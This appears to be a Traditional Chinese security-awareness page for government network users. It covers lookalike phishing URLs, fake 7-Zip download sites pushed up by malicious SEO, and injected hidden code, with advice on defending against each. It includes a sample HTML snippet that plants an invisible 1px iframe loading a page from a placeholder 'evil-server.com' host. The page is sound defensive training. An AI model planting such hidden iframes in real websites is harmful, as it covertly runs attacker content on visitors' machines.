威脅一：以假亂真的網址陷阱

攻擊者利用與合法網站極度相似的「偽冒網址」來誘騙您，目的是竊取您的帳號密碼。

互動體驗：懸停查看真相

您收到一封郵件，內含一個連結。它看起來是安全的，但真的如此嗎？

前往 google.com 更新您的帳戶
真實連結: g00gle-security.com

防範之道：

點擊前，將滑鼠懸停在連結上，檢查瀏覽器左下角顯示的真實網址。若有疑慮，請手動輸入官方網址。

威脅二：搜尋引擎的信任陷阱

攻擊者利用「惡意SEO」技術，將偽冒網站推上搜尋結果頂端，使其看起來像官方結果。

互動體驗：點擊危險連結

您搜尋「7-Zip 繁體中文版下載」，哪個才是官方網站？

7-Zip 官方網站

https://www.7-zip.org

正版軟體的官方來源，安全可靠。

7-Zip 繁體中文版免費下載

https://www.get-7zip-free.com

一鍵下載，立即安裝！最新版本，完全免費。

防範之道：

養成「驗證網域」的習慣。點擊前，仔細核對是否為官方網域。堅持前往官方網站下載軟體。

威脅三：看不見的惡意程式碼

即使是合法網站也可能被駭客入侵，植入惡意程式碼，在您瀏覽時於背景執行惡意行為。

互動體驗：揭露隱藏的程式碼

您正在瀏覽一個新聞網站，但頁面中可能隱藏著您看不見的東西。

<!-- A normal website content -->
<h1>Today's News</h1>
<p>Some interesting story...</p>
<!-- Malicious code hidden by attacker -->
<iframe src="http://evil-server.com/mine.html" style="width:1px; height:1px; opacity:0;"></iframe>

防範之道：

關鍵在於「淨化您的上網範圍」。避免瀏覽與公務無關或高風險網站（如免費影音、P2P分享）。

每位使用者都是網路安全的守門員

公務網路的安全與信譽，並非僅是資訊單位的責任，而是每一位使用者的共同使命。一個不經意的點擊，都可能造成嚴重後果。讓我們共同努力，透過謹慎的網路行為，確保公務網路的順暢、安全與可靠。
